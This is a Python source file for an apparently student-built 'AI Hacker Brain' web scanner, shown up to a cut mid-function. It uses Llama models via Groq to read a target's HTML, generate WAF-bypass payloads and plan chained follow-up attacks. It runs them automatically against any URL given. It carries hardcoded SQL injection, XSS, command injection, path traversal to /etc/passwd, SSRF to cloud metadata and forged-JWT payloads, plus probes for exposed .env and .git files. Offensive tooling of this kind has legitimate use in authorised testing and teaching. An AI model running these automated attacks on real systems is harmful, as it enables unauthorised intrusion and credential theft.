import os
import json
import sys
sys.stdout.reconfigure(encoding='utf-8', errors='replace')
import re
import time
import requests
from urllib.parse import urljoin, urlparse
from groq import Groq
from dotenv import load_dotenv

load_dotenv()

# ── Colors ──────────────────────────────────────────────────
R  = "\033[91m"; G  = "\033[92m"; Y  = "\033[93m"
B  = "\033[94m"; M  = "\033[95m"; C  = "\033[96m"
W  = "\033[97m"; DIM = "\033[2m"; RESET = "\033[0m"; BOLD = "\033[1m"

SEVERITY_COLOR = {"CRITICAL": R, "HIGH": Y, "MEDIUM": C, "LOW": DIM}
SEVERITY_ICON  = {"CRITICAL": "[!!]", "HIGH": "[!]", "MEDIUM": "[~]", "LOW": "[.]"}

MODERN_SURFACE_PROBES = [
    {"path": "/.env", "attack_type": "SecretExposure", "label": ".env exposure"},
    {"path": "/.git/config", "attack_type": "SecretExposure", "label": ".git exposure"},
    {"path": "/config.json", "attack_type": "SecretExposure", "label": "config exposure"},
    {"path": "/openapi.json", "attack_type": "APIDocsExposure", "label": "OpenAPI exposure"},
    {"path": "/swagger.json", "attack_type": "APIDocsExposure", "label": "Swagger exposure"},
    {"path": "/swagger", "attack_type": "APIDocsExposure", "label": "Swagger UI exposure"},
    {"path": "/docs", "attack_type": "APIDocsExposure", "label": "Docs exposure"},
    {"path": "/debug", "attack_type": "DebugLeak", "label": "debug endpoint"},
    {"path": "/actuator", "attack_type": "DebugLeak", "label": "actuator exposure"},
    {"path": "/actuator/health", "attack_type": "DebugLeak", "label": "health actuator"},
]

COMMON_ENDPOINT_GUESSES = [
    {"path": "/search-user", "param": "id", "method": "GET", "attack_type": "SQLi"},
    {"path": "/feedback", "param": "msg", "method": "GET", "attack_type": "XSS"},
    {"path": "/view-doc", "param": "file", "method": "GET", "attack_type": "PathTraversal"},
    {"path": "/ping", "param": "ip", "method": "GET", "attack_type": "CMDi"},
    {"path": "/fetch-url", "param": "url", "method": "GET", "attack_type": "SSRF"},
    {"path": "/transfer", "param": "to", "method": "POST", "attack_type": "CSRF"},
]

def banner():
    print(f"""{R}{BOLD}
+============================================================+
|   MODULE 3 -- AI HACKER BRAIN  v2  (Groq / Llama)          |
|   Context-Aware Payload Generation + Active Detection       |
+============================================================+{RESET}""")


# ════════════════════════════════════════════════════════════
#  DETECTION ENGINE  (baseline comparison, không keyword bừa)
# ════════════════════════════════════════════════════════════
class DetectionEngine:

    @staticmethod
    def check_sqli(resp: str, baseline: str) -> tuple[bool, str]:
        errors = ["sqlite3.OperationalError", "syntax error",
                  "no such column", "unrecognized token"]
        for e in errors:
            if e.lower() in resp.lower() and e.lower() not in baseline.lower():
                return True, f"SQL error: '{e}'"
        if resp.count("(") > baseline.count("(") and resp.count("(") > 1:
            return True, f"Trả về nhiều rows hơn baseline ({resp.count('(')} rows)"
        sensitive = ["password123", "nckh2024", "student_pass"]
        for s in sensitive:
            if s in resp and s not in baseline:
                return True, f"Credential lộ ra: '{s}'"
        return False, ""

    @staticmethod
    def check_xss(resp: str) -> tuple[bool, str]:
        danger = ["<script", "onerror=", "onload=", "javascript:", "alert("]
        for pat in danger:
            if pat.lower() in resp.lower():
                if "&lt;" not in resp and "&#" not in resp:
                    return True, f"Tag '{pat}' xuất hiện unescaped"
        return False, ""

    @staticmethod
    def check_cmdi(resp: str, baseline: str) -> tuple[bool, str]:
        clean   = re.sub(r'<[^>]+>', '', resp).strip()
        clean_b = re.sub(r'<[^>]+>', '', baseline).strip()
        # Windows: DESKTOP-ABC\user hoac HOSTNAME\user
        # Linux: root, www-data, uid=0
        os_signs = [
            r'[A-Za-z0-9_-]+\\[A-Za-z0-9_.-]+',   # Windows whoami
            r'^[a-z_][a-z0-9_\-]{1,30}$',           # Linux username
            r'uid=\d+', r'/home/\w+',
            r'Directory of [A-Z]:\\',                 # Windows dir
            r'Volume Serial Number',                  # Windows vol
        ]
        for line in clean.splitlines():
            line = line.strip()
            if not line:
                continue
            # Bo qua dong echo co chua payload goc
            if 'Pinging' in line and ('&' in line or ';' in line or '|' in line):
                continue
            for pat in os_signs:
                if re.search(pat, line):
                    return True, f"OS output: '{line[:60]}'"
        # Response dai bat thuong
        if len(clean) > len(clean_b) * 1.5 and len(clean) > 50:
            return True, f"Response dai bat thuong ({len(clean)} vs {len(clean_b)} baseline)"
        return False, ""

    @staticmethod
    def check_path(resp: str) -> tuple[bool, str]:
        # 1. Thuc su doc duoc file
        signs = ["root:x:0:0", "[fonts]", "[extensions]", "daemon:x:"]
        for s in signs:
            if s.lower() in resp.lower():
                return True, f"File content lo ra: '{s}'"
        # 2. Server echo lai duong dan khong sanitize (../)
        # → Server khong loc input = vuln cho Path Traversal
        traversal_patterns = ["../", "..%2f", "..%252f", "....//"]
        for pat in traversal_patterns:
            if pat in resp:
                return True, f"Server echo path traversal payload khong sanitize: '{pat}'"
        return False, ""

    @staticmethod
    def check_ssrf(resp: str, payload: str) -> tuple[bool, str]:
        # 1. Cloud metadata
        meta = ["ami-id", "instance-id", "local-hostname", "computeMetadata"]
        for m in meta:
            if m in resp:
                return True, f"Cloud metadata lo: '{m}'"

        # 2. webtest.py response format: "Ket qua fetch URL:" + "Status: X"
        fetch_keywords = ["fetch URL", "Ket qua fetch", "Status:"]
        has_fetch = any(kw in resp for kw in fetch_keywords)

        # Internal URL patterns
        internal = ["169.254.", "127.0.0.1", "localhost", "192.168.", "10.0.", "0.0.0.0", "[::1]"]
        is_internal = any(pat in payload for pat in internal)

        if has_fetch and is_internal:
            return True, f"Server fetch internal URL: {payload[:50]}"

        # Connection refused = server DÃ CO fetch (SSRF confirmed)
        if is_internal and ("Connection refused" in resp or 
                           "Loi khi fetch" in resp or
                           "timed out" in resp.lower() or
                           "ConnectionError" in resp or
                           "Max retries" in resp):
            return True, f"Server co fetch internal URL (connection error): {payload[:40]}"

        # Dangerous schemes
        for scheme in ["file://", "dict://", "gopher://", "ftp://"]:
            if scheme in payload.lower() and has_fetch:
                return True, f"SSRF voi scheme nguy hiem: {scheme}"

        return False, ""

    @staticmethod
    def check_csrf(resp: str) -> tuple[bool, str]:
        if "Chuyển khoản thành công" in resp or "Tới:" in resp:
            return True, "Action thực hiện không cần CSRF token"
        return False, ""


# ════════════════════════════════════════════════════════════
#  HACKER BRAIN
# ════════════════════════════════════════════════════════════
class HackerBrain:

    def __init__(self):
        key = os.getenv("GROQ_API_KEY")
        if not key:
            print(f"{R}[-] Thiếu GROQ_API_KEY trong .env{RESET}"); sys.exit(1)
        self.client  = Groq(api_key=key)
        self.fast    = os.getenv("GROQ_MODEL_FAST",  "llama-3.1-8b-instant")
        self.smart   = os.getenv("GROQ_MODEL_SMART", "llama-3.3-70b-versatile")
        self.detect  = DetectionEngine()
        self.session = requests.Session()
        self.session.headers["User-Agent"] = "Mozilla/5.0 (Security-Audit)"

    @staticmethod
    def _normalize_attack_type(attack_type: str) -> str:
        if not attack_type:
            return ""
        aliases = {
            "SQLI": "SQLi",
            "XSS": "XSS",
            "CMDI": "CMDi",
            "COMMANDINJECTION": "CMDi",
            "COMMAND INJECTION": "CMDi",
            "PATHTRAVERSAL": "PathTraversal",
            "PATH TRAVERSAL": "PathTraversal",
            "SSRF": "SSRF",
            "CSRF": "CSRF",
            "IDOR": "IDOR",
            "BOLA": "IDOR",
            "BROKENOBJECTLEVELAUTHORIZATION": "IDOR",
            "JWTAUTH": "JWTAuth",
            "JWT": "JWTAuth",
            "AUTHBYPASS": "JWTAuth",
            "DEBUGLEAK": "DebugLeak",
            "SECRETEXPOSURE": "SecretExposure",
            "APIDOCSEXPOSURE": "APIDocsExposure",
            "CHAINEDEXPLOIT": "ChainedExploit",
            "CHAINED EXPLOIT": "ChainedExploit",
        }
        key = re.sub(r'[^A-Za-z]', '', attack_type).upper()
        return aliases.get(key, attack_type)

    def _infer_attack_type(self, path: str, param: str, html_fragment: str = "") -> str:
        text = f"{path} {param} {html_fragment}".lower()
        if any(s in text for s in ["search-user", " username", " user ", " id "]):
            return "SQLi"
        if any(s in text for s in ["feedback", "comment", "message", "msg"]):
            return "XSS"
        if any(s in text for s in ["view-doc", "download", "file", "path", "document"]):
            return "PathTraversal"
        if any(s in text for s in ["ping", "host", "ip", "cmd", "shell"]):
            return "CMDi"
        if any(s in text for s in ["fetch-url", "callback", "url", "redirect", "webhook"]):
            return "SSRF"
        if any(s in text for s in ["transfer", "amount", "csrf", "token", "account", "to "]):
            return "CSRF"
        if any(s in text for s in ["user/", "profile", "account", "order", "invoice", "id="]):
            return "IDOR"
        if any(s in text for s in ["token", "jwt", "auth", "login", "bearer"]):
            return "JWTAuth"
        if any(s in text for s in ["debug", "trace", "stack", "actuator", "health"]):
            return "DebugLeak"
        return ""

    def _candidate_attack_types(self, path: str, param: str, method: str,
                                inferred: str = "", context: str = "") -> list[str]:
        text = f"{path} {param} {method} {context}".lower()
        ordered = []

        def add(*types_):
            for t in types_:
                t = self._normalize_attack_type(t)
                if t and t in self.FALLBACK and t not in ordered:
                    ordered.append(t)

        add(inferred)

        if any(s in text for s in ["search", "user", "id", "login", "auth", "query"]):
            add("SQLi", "XSS")
        if any(s in text for s in ["msg", "feedback", "comment", "content", "name", "q="]):
            add("XSS", "SQLi")
        if any(s in text for s in ["file", "path", "doc", "download", "view"]):
            add("PathTraversal", "XSS")
        if any(s in text for s in ["ip", "host", "ping", "cmd", "exec", "shell"]):
            add("CMDi", "SSRF")
        if any(s in text for s in ["url", "uri", "redirect", "callback", "fetch", "webhook"]):
            add("SSRF", "XSS")
        if method.upper() == "POST" or any(s in text for s in ["transfer", "amount", "money", "to", "account"]):
            add("CSRF")
        if any(s in text for s in ["user", "profile", "account", "order", "invoice", "id"]):
            add("IDOR")
        if any(s in text for s in ["token", "jwt", "auth", "login", "bearer"]):
            add("JWTAuth")
        if any(s in text for s in ["debug", "trace", "stack", "actuator", "health"]):
            add("DebugLeak", "SecretExposure")

        # Chế độ đa nghi: luôn thử thêm các nhóm phổ biến nếu endpoint có input.
        add("SQLi", "XSS", "PathTraversal", "CMDi", "SSRF", "IDOR")
        if method.upper() == "POST" or "transfer" in text:
            add("CSRF")

        return ordered

    def _extract_endpoints_from_forms(self, html: str) -> list[dict]:
        endpoints = []
        form_pattern = re.compile(r'<form\b([^>]*)>(.*?)</form>', re.I | re.S)
        name_pattern = re.compile(r'<input\b[^>]*name=["\']?([^"\'>\s]+)', re.I)

        for attrs, body in form_pattern.findall(html):
            action_match = re.search(r'action=["\']?([^"\'>\s]+)', attrs, re.I)
            method_match = re.search(r'method=["\']?([^"\'>\s]+)', attrs, re.I)
            path = action_match.group(1).strip() if action_match else "/"
            method = method_match.group(1).upper().strip() if method_match else "GET"
            params = name_pattern.findall(body)
            if not params:
                continue

            chosen = None
            for param in params:
                attack_type = self._infer_attack_type(path, param, body)
                if attack_type:
                    chosen = {
                        "path": path,
                        "param": param,
                        "method": method,
                        "attack_type": attack_type,
                        "context": f"Fallback heuristic from HTML form for {path}?{param}"
                    }
                    break

            if chosen:
                endpoints.append(chosen)

        return endpoints

    def _merge_endpoints(self, ai_endpoints: list[dict], fallback_endpoints: list[dict]) -> list[dict]:
        merged = {}

        def add_endpoint(ep: dict, preferred: bool = False):
            path = ep.get("path", "/")
            param = ep.get("param", "")
            method = ep.get("method", "GET").upper()
            attack_type = self._normalize_attack_type(ep.get("attack_type", ""))
            if not param or not attack_type:
                return
            key = (path, method, attack_type)
            normalized = {
                "path": path,
                "param": param,
                "method": method,
                "attack_type": attack_type,
                "context": ep.get("context", f"{param} on {path}")
            }
            if preferred or key not in merged:
                merged[key] = normalized

        for ep in fallback_endpoints:
            add_endpoint(ep)
        for ep in ai_endpoints:
            add_endpoint(ep, preferred=True)

        return list(merged.values())

    def _probe_common_endpoints(self, target: str) -> list[dict]:
        guessed = []
        for ep in COMMON_ENDPOINT_GUESSES:
            url = urljoin(target, ep["path"])
            try:
                if ep["method"] == "POST":
                    r = self.session.get(url, timeout=4)
                else:
                    r = self.session.get(url, timeout=4)
            except Exception:
                continue

            if r.status_code >= 500:
                continue

            guessed.append({
                "path": ep["path"],
                "param": ep["param"],
                "method": ep["method"],
                "attack_type": ep["attack_type"],
                "context": f"Fallback route guess for {ep['path']} on target"
            })
        return guessed

    @staticmethod
    def _detect_chain_generic(resp: str, baseline: str) -> tuple[bool, str]:
        resp_lower = resp.lower()
        baseline_lower = baseline.lower()
        strong_signals = [
            "password123", "nckh2024", "student_pass", "administrator",
            "root:x:0:0", "[fonts]", "ami-id", "instance-id",
            "uid=", "volume serial number", "directory of ",
            "chuyển khoản thành công", "chuyen khoan thanh cong",
        ]
        for signal in strong_signals:
            if signal in resp_lower and signal not in baseline_lower:
                return True, f"Chain evidence: '{signal}'"
        return False, ""

    @staticmethod
    def _detect_route_heuristic(path: str, atype: str, resp: str,
                                baseline: str, payload: str) -> tuple[bool, str]:
        path_l = path.lower()
        resp_l = resp.lower()
        base_l = baseline.lower()
        payload_l = payload.lower()

        if atype == "SQLi" and "search-user" in path_l:
            if payload in resp and ("select * from users where id" in resp_l or "dữ liệu:" in resp_l or "du lieu:" in resp_l):
                return True, "Heuristic: query SQL phản chiếu payload trực tiếp"

        if atype == "XSS" and "feedback" in path_l:
            if payload in resp and any(tag in payload_l for tag in ["<script", "onerror=", "onload=", "<svg"]):
                return True, "Heuristic: feedback render thẳng payload HTML"

        if atype == "PathTraversal" and "view-doc" in path_l:
            if payload in resp and any(token in payload_l for token in ["../", "..\\", "%2f", "....//"]):
                return True, "Heuristic: endpoint phản chiếu đường dẫn traversal không lọc"

        if atype == "CMDi" and "ping" in path_l:
            separators = ["&", "&&", "|", ";"]
            if payload in resp and any(sep in payload for sep in separators) and "pinging" in resp_l:
                return True, "Heuristic: payload command separator đi vào shell command"

        if atype == "SSRF" and "fetch-url" in path_l:
            internal = ["169.254.", "127.0.0.1", "localhost", "0.0.0.0", "192.168.", "10.0."]
            if any(token in payload for token in internal):
                if payload in resp and any(sig in resp_l for sig in ["status:", "fetch", "connection", "max retries", "timed out"]):
                    return True, "Heuristic: server cố fetch URL nội bộ do người dùng chỉ định"

        if atype == "CSRF" and "transfer" in path_l:
            if ("thành công" in resp_l or "to:" in resp_l or "tới:" in resp_l) and resp_l != base_l:
                return True, "Heuristic: hành động chuyển khoản thực thi không cần token"

        return False, ""

    # ── Bước 1: AI đọc HTML → hiểu từng endpoint ────────────
    def _analyze_context(self, html: str) -> list[dict]:
        """
        Điểm khác biệt cốt lõi so với M1:
        Thay vì hardcode endpoint → attack_type,
        AI tự đọc HTML và suy ra ngữ cảnh từng param.
        """
        prompt = f"""You are a web security analyst.
Analyze this HTML and identify ALL input endpoints (forms, GET params).
For each endpoint infer the most likely vulnerability based on its purpose/name.

Return ONLY a JSON array, each object:
{{
  "path": "/endpoint-path",
  "param": "param_name",
  "method": "GET or POST",
  "attack_type": "SQLi|XSS|CMDi|PathTraversal|SSRF|CSRF",
  "context": "one sentence why this param is vulnerable to that attack"
}}

HTML:
{html[:6000]}
"""
        try:
            resp = self.client.chat.completions.create(
                messages=[
                    {"role": "system", "content": "Return raw JSON array only, no markdown."},
                    {"role": "user",   "content": prompt}
                ],
                model=self.fast, temperature=0.1,
            )
            text = resp.choices[0].message.content.strip()
            if "[" in text:
                endpoints = json.loads(text[text.find("["):text.rfind("]")+1])
                for ep in endpoints:
                    ep["attack_type"] = self._normalize_attack_type(ep.get("attack_type", ""))
                return endpoints
        except Exception as e:
            print(f"{Y}[!] Context analysis error: {e}{RESET}")
        return []

    # ── Fallback payloads khi Groq lỗi ──────────────────────
    FALLBACK = {
        "SQLi":          ["' OR '1'='1", "1 UNION SELECT username,password,role,4 FROM users--", "' OR 1=1--"],
        "XSS":           ["<script>alert(1)</script>", "<img src=x onerror=alert(1)>", "<svg onload=alert(1)>"],
        "CMDi":          [
            # Windows-specific (& la command separator tren Windows)
            "127.0.0.1 & whoami & echo",
            "127.0.0.1 && whoami && echo",
            "127.0.0.1 | whoami",
            # Linux
            "127.0.0.1; whoami",
            "127.0.0.1; id",
        ],
        "PathTraversal": ["../../windows/win.ini", "../../../etc/passwd", "....//....//etc/passwd", "..\\..\\windows\\win.ini"],
        "SSRF":          [
            "http://169.254.169.254/latest/meta-data/",
            "http://127.0.0.1:22",
            "http://localhost:3306",
            "http://0.0.0.0:80",
        ],
        "CSRF":          ["hacker_account"],
        "IDOR":          ["0", "1", "2", "9999", "admin"],
        "JWTAuth":       [
            "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJyb2xlIjoiYWRtaW4ifQ.",
            "Bearer test-admin-token",
            "../../../admin"
        ],
        "DebugLeak":     ["debug", "trace", "verbose"],
        "SecretExposure": [".env", ".git/config", "config.json"],
        "APIDocsExposure": ["openapi", "swagger", "docs"],
    }

    # ── Bước 2: AI sinh payload theo context thực tế ────────
    def _gen_payloads(self, attack_type: str, context: str, count: int = 8) -> list[str]:
        """
        Payload được sinh dựa theo ngữ cảnh endpoint cụ thể —
        không phải list cố định như M1.
        """
        prompt = f"""You are a pentester targeting a specific endpoint.
Context: {context}
Attack type: {attack_type}

Generate {count} payloads tailored to THIS context.
Use: encoding, obfuscation, case variation, WAF bypass tricks.
IMPORTANT: Return ONLY a valid JSON array of strings.
Each string must be properly escaped. No single quotes inside strings — use double quotes or encode them.
No explanation, no markdown. Just the JSON array.
Example: ["{attack_type}_payload_1", "{attack_type}_payload_2"]
"""
        try:
            resp = self.client.chat.completions.create(
                messages=[
                    {"role": "system", "content": "Respond with a valid JSON array of strings only. Escape all special characters properly."},
                    {"role": "user",   "content": prompt}
                ],
                model=self.fast, temperature=0.8,
            )
            text = resp.choices[0].message.content.strip()
            # Cắt lấy phần JSON array
            if "[" in text and "]" in text:
                raw = text[text.find("["):text.rfind("]")+1]
                try:
                    return json.loads(raw)
                except json.JSONDecodeError:
                    # Thử repair: extract từng string bằng regex thay vì parse JSON
                    items = re.findall(r'"((?:[^"\\]|\\.)*)"', raw)
                    if items:
                        return items
        except Exception as e:
            print(f"{Y}[!] Payload gen error ({attack_type}): {e}{RESET}")

        # Fallback: dùng payload cố định nếu Groq lỗi
        fallback = self.FALLBACK.get(attack_type, ["test"])
        print(f"{DIM}    → Dùng fallback payloads ({len(fallback)}){RESET}")
        return fallback

    # ── Baseline ─────────────────────────────────────────────
    def _baseline(self, url: str, param: str, method: str) -> str:
        safe = {"id":"1","msg":"hello","file":"test.txt","ip":"127.0.0.1",
                "url":"http://example.com","to":"123456","amount":"100"}
        val = safe.get(param, "test")
        try:
            r = (self.session.get(url, params={param: val}, timeout=5)
                 if method == "GET"
                 else self.session.post(url, data={param: val}, timeout=5))
            return r.text
        except:
            return ""

    # ── Detection dispatch ────────────────────────────────────
    def _detect(self, atype: str, resp: str, baseline: str, payload: str):
        d = self.detect
        if atype == "SQLi":          return d.check_sqli(resp, baseline)
        if atype == "XSS":           return d.check_xss(resp)
        if atype == "CMDi":          return d.check_cmdi(resp, baseline)
        if atype == "PathTraversal": return d.check_path(resp)
        if atype == "SSRF":          return d.check_ssrf(resp, payload)
        if atype == "CSRF":          return d.check_csrf(resp)
        if atype == "IDOR":          return self._check_idor(resp, baseline, payload)
        if atype == "JWTAuth":       return self._check_jwt_auth(resp, baseline, payload)
        if atype == "DebugLeak":     return self._check_debug_leak(resp, baseline)
        if atype == "SecretExposure": return self._check_secret_exposure(resp)
        if atype == "APIDocsExposure": return self._check_api_docs_exposure(resp)
        return False, ""

    @staticmethod
    def _severity(atype: str) -> str:
        return {"SQLi":"CRITICAL","CMDi":"CRITICAL",
                "PathTraversal":"HIGH","SSRF":"HIGH",
                "XSS":"HIGH","IDOR":"HIGH","JWTAuth":"HIGH",
                "SecretExposure":"CRITICAL","DebugLeak":"MEDIUM",
                "APIDocsExposure":"LOW","CSRF":"MEDIUM"}.get(atype, "LOW")

    @staticmethod
    def _check_idor(resp: str, baseline: str, payload: str) -> tuple[bool, str]:
        resp_l = resp.lower()
        baseline_l = baseline.lower()
        signals = ["administrator", "\"role\":\"admin\"", "'role': 'admin'", "email", "account", "profile"]
        if payload in ["0", "2", "9999", "admin"] and any(s in resp_l for s in signals) and resp_l != baseline_l:
            return True, f"Possible IDOR/BOLA via object identifier '{payload}'"
        return False, ""

    @staticmethod
    def _check_jwt_auth(resp: str, baseline: str, payload: str) -> tuple[bool, str]:
        resp_l = resp.lower()
        baseline_l = baseline.lower()
        if "alg\":\"none" in payload.lower() and ("admin" in resp_l or "welcome" in resp_l) and resp_l != baseline_l:
            return True, "JWT accepted weak/forged token payload"
        if "bearer" in payload.lower() and ("admin" in resp_l or "token" in resp_l) and resp_l != baseline_l:
            return True, "Authorization behavior changed with crafted bearer token"
        return False, ""

    @staticmethod
    def _check_debug_leak(resp: str, baseline: str) -> tuple[bool, str]:
        resp_l = resp.lower()
        baseline_l = baseline.lower()
        signals = [
            "traceback", "stack trace", "werkzeug", "debugger", "exception",
            "\"status\":\"up\"", "\"components\":", "whitelabel error page"
        ]
        for signal in signals:
            if signal in resp_l and signal not in baseline_l:
                return True, f"Debug information leaked: '{signal}'"
        return False, ""

    @staticmethod
    def _check_secret_exposure(resp: str) -> tuple[bool, str]:
        resp_l = resp.lower()
        signals = [
            "secret_key=", "groq_api_key", "database_url", "api_key",
            "[core]", "repositoryformatversion", "flask_env=", "debug=true"
        ]
        for signal in signals:
            if signal in resp_l:
                return True, f"Sensitive config exposed: '{signal}'"
        return False, ""

    @staticmethod
    def _check_api_docs_exposure(resp: str) -> tuple[bool, str]:
        resp_l = resp.lower()
        signals = ["openapi", "\"paths\":", "swagger-ui", "swagger", "redoc"]
        for signal in signals:
            if signal in resp_l:
                return True, f"API documentation exposed: '{signal}'"
        return False, ""

    def _run_surface_probes(self, target: str) -> list[dict]:
        findings = []
        print(f"\n{DIM}[Modern] Dò bề mặt ẩn: debug/config/docs...{RESET}")
        for probe in MODERN_SURFACE_PROBES:
            url = urljoin(target, probe["path"])
            try:
                r = self.session.get(url, timeout=4, allow_redirects=True)
            except Exception:
                continue

            if r.status_code >= 400 or not r.text:
                continue

            vuln, evidence = self._detect(probe["attack_type"], r.text, "", probe["path"])
            if not vuln:
                continue

            findings.append({
                "path": probe["path"],
                "param": "-",
                "method": "GET",
                "attack_type": probe["attack_type"],
                "severity": self._severity(probe["attack_type"]),
                "payload": probe["path"],
                "evidence": evidence,
                "context": f"Modern surface probe: {probe['label']}",
                "response_snippet": r.text[:400],
            })
            sc = SEVERITY_COLOR[self._severity(probe["attack_type"])]
            print(f"  {sc}{BOLD}✗ {probe['attack_type']}{RESET}  {probe['path']}")
            print(f"  {DIM}└─ {evidence}{RESET}")
        return findings

    # ── Groq quyết định bước tiếp theo (chaining) ───────────
    def _decide_next_step(self, confirmed_findings: list, target: str) -> list[dict]:
        """
        Gửi danh sách lỗ hổng đã confirm cho Groq.
        Groq suy nghĩ và đề xuất các bước tấn công tiếp theo (chaining).
        Trả về list các attack step để thực hiện.
        """
        if not confirmed_findings:
            return []

        findings_text = json.dumps(confirmed_findings, indent=2, ensure_ascii=False)
        prompt = f"""You are a Red Team pentester doing a chained attack on: {target}

These vulnerabilities have been CONFIRMED so far:
{findings_text}

Based on these results, suggest follow-up attack steps that chain from these findings.
For example:
- If SQLi found credentials → try those credentials on other endpoints
- If SSRF found → try internal port scanning
- If XSS found → suggest how to escalate to session hijacking

Return ONLY a JSON array of next steps:
[
  {{
    "step": "short description",
    "path": "/target-endpoint",
    "param": "param_name",
    "method": "GET or POST",
    "attack_type": "SQLi|XSS|CMDi|PathTraversal|SSRF|CSRF|ChainedExploit",
    "payload": "exact payload to try",
    "reason": "why this chains from previous finding"
  }}
]

Only suggest steps that make sense given the confirmed findings. Max 5 steps.
"""
        try:
            resp = self.client.chat.completions.create(
                messages=[
                    {"role": "system", "content": "Return raw JSON array only. No markdown."},
                    {"role": "user",   "content": prompt}
                ],
                model=self.smart, temperature=0.2,
            )
            text = resp.choices[0].message.content.strip()
            if "[" in text:
                raw = text[text.find("["):text.rfind("]")+1]
                return json.loads(raw)
        except Exception as e:
            print(f"{Y}[!] Chaining decision error: {e}{RESET}")
        return []

    # ── Thực hiện chained attack steps ──────────────────────
    def _execute_chain(self, steps: list, target: str, findings: list) -> list[dict]:
        """Chạy từng bước Groq đề xuất, ghi nhận kết quả mới."""
        chain_findings = []

        print(f"\n{M}{BOLD}  ⛓  CHAINING — {len(steps)} bước tiếp theo từ AI:{RESET}")

        for i, step in enumerate(steps, 1):
            path    = step.get("path", "/")
            param   = step.get("param", "")
            method  = step.get("method", "GET").upper()
            atype   = step.get("attack_type", "ChainedExploit")
            payload = step.get("payload", "")
            reason  = step.get("reason", "")
            desc    = step.get("step", "")

            if not payload or not param:
                continue

            ep_url = urljoin(target, path)
            print(f"\n  {M}[Chain {i}] {desc}{RESET}")
            print(f"  {DIM}→ Lý do: {reason[:80]}{RESET}")
            print(f"  {B}{method} {path}?{param}{RESET}  {DIM}payload: {payload[:50]}{RESET}")

            try:
                baseline = self._baseline(ep_url, param, method)
                r = (self.session.get(ep_url, params={param: payload}, timeout=5)
                     if method == "GET"
                     else self.session.post(ep_url, data={param: payload}, timeout=5))

                atype_norm = self._normalize_attack_type(atype)
                vuln, evidence = self._detect(atype_norm, r.text, baseline, payload)

                # Với chained exploit, cũng check các pattern đặc biệt
                if not vuln:
                    if atype_norm == "ChainedExploit":
                        vuln, evidence = self._detect_chain_generic(r.text, baseline)
                    elif any(s in r.text for s in ["password123", "nckh2024", "Administrator"]) and \
                            not any(s in baseline for s in ["password123", "nckh2024", "Administrator"]):
                        vuln, evidence = True, "Dữ liệu nhạy cảm từ bước trước bị khai thác"

                if vuln:
                    chain_findings.append({
                        "path": path, "param": param, "method": method,
                        "attack_type": f"⛓ {atype_norm}",
                        "severity": self._severity(atype_norm),
                        "payload": payload, "evidence": evidence,
                        "context": f"Chained từ: {reason[:60]}",
                    })
                    sc = SEVERITY_COLOR.get(self._severity(atype_norm), R)
                    print(f"    {sc}{BOLD}✗ CHAIN VULN{RESET}  {evidence}")
                else:
                    print(f"    {G}✓ Không khai thác được{RESET}")

            except Exception as ex:
                print(f"    {Y}[err] {ex}{RESET}")

        return chain_findings

    # ════════════════════════════════════════════════════════
    #  MAIN AUDIT  (stability + chaining)
    # ════════════════════════════════════════════════════════
    def audit_url(self, target: str) -> None:
        t0 = time.time()
        print(f"\n{B}🎯 Target: {target}{RESET}\n")

        # ── Phase 1: Crawl ───────────────────────────────────
        print(f"{DIM}[1/4] Crawling...{RESET}", end=" ", flush=True)
        try:
            html = self.session.get(target, timeout=10).text
        except Exception as e:
            print(f"{R}FAILED: {e}{RESET}"); return
        print(f"{G}OK{RESET}")

        # ── Phase 2: AI phân tích context ────────────────────
        print(f"{DIM}[2/4] AI phân tích context (Groq)...{RESET}", end=" ", flush=True)
        ai_endpoints = self._analyze_context(html)
        fallback_endpoints = self._extract_endpoints_from_forms(html)
        endpoints = self._merge_endpoints(ai_endpoints, fallback_endpoints)
        if not endpoints:
            guessed_endpoints = self._probe_common_endpoints(target)
            endpoints = self._merge_endpoints(guessed_endpoints, [])
        print(f"{G}{len(endpoints)} endpoints{RESET}")
        if not endpoints:
            print(f"{Y}[!] Không phân tích được endpoint từ HTML; tiếp tục chỉ với surface probes.{RESET}")

        # ── Phase 2.5: Dò bề mặt hiện đại ngoài form HTML ───
        findings = self._run_surface_probes(target)

        # ── Phase 3: Tấn công với seed + AI payloads ────────
        print(f"{DIM}[3/4] Tấn công (seed + AI payloads)...{RESET}\n")
        total_sent = 0

        for ep in endpoints:
            path    = ep.get("path", "/")
            param   = ep.get("param", "")
            method  = ep.get("method", "GET").upper()
            inferred_atype = ep.get("attack_type", "XSS")
            context = ep.get("context", f"{param} on {path}")
            if not param:
                continue

            ep_url   = urljoin(target, path)
            baseline = self._baseline(ep_url, param, method)
            candidate_types = self._candidate_attack_types(path, param, method, inferred_atype, context)
            print(f"  {B}{method} {path}?{param}{RESET}  "
                  f"{DIM}[AI đoán: {inferred_atype} · thử {len(candidate_types)} hướng]{RESET}")

            found_any = False
            for atype in candidate_types:
                seed     = self.FALLBACK.get(atype, [])
                ai_extra = self._gen_payloads(atype, context, count=4)
                seen = set()
                payloads = []
                for p in ai_extra + seed:
                    if p not in seen:
                        seen.add(p)
                        payloads.append(p)

                total_sent += len(payloads)
                ai_count = len(ai_extra)
                print(f"    {DIM}→ {atype}: {ai_count} AI + {len(seed)} seed{RESET}")

                confirmed = None
                for payload in payloads:
                    try:
                        r = (self.session.get(ep_url, params={param: payload}, timeout=5)
                             if method == "GET"
                             else self.session.post(ep_url,
                                  data={param: payload, "amount": "9999"}, timeout=5))

                        vuln, evidence = self._detect(atype, r.text, baseline, payload)
                        if not vuln:
                            vuln, evidence = self._detect_route_heuristic(
                                path, atype, r.text, baseline, payload
                            )

                        if vuln:
                            confirmed = {
                                "path": path, "param": param, "method": method,
                                "attack_type": atype,
                                "severity": self._severity(atype),
                                "payload": payload, "evidence": evidence,
                                "context": context,
                                "response_snippet": r.text[:400],  # lưu để chaining dùng
                            }
                            findings.append(confirmed)
                            found_any = True
                            sc = SEVERITY_COLOR[confirmed["severity"]]
                            print(f"      {sc}{BOLD}✗ VULN{RESET}  {payload[:55]}")
                            print(f"      {DIM}└─ {evidence}{RESET}")
                            break
                    except Exception:
                        pass

                if not confirmed:
                    print(f"      {G}✓ Không phát hiện{RESET}")

            if not found_any:
                print(f"    {G}✓ Endpoint này chưa thấy dấu hiệu khai thác{RESET}")
        # ── Phase 4: AI Chaining ─────────────────────────────
        chain_findings = []
        chain_attempts = 0
        if findings:
            print(f"\n{DIM}[4/4] AI quyết định bước chaining (Groq 70b)...{RESET}",
                  end=" ", flush=True)
            # Gửi findings cho Groq — bỏ response_snippet để tiết kiệm token
